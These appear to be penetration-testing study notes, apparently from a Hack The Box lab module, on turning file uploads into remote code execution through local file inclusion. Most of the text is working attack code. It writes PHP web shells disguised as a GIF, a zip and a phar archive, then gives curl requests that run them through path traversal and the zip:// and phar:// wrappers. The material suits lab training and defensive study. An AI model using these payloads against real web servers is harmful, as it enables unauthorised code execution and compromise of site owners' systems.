File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.

If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.

### Image upload
Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded.

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Find upload path
![](https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg)

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Exploit
```bash
curl http://94.237.54.42:42058/index.php?language=./profile_images/shell.gif&cmd=id

curl http://10.10.10.10/index.php?language=../../../../../../../profile_images/shell.gif&cmd=id
```

### Zip Upload
We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:

[Attack in blog](https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38--------------------------------)

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```bash
curl http://10.10.10.10./index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

curl http://10.10.10.10./index.php?language=zip://../../../../../profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar Upload
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Compile
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```bash
http://10.10.10.10/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```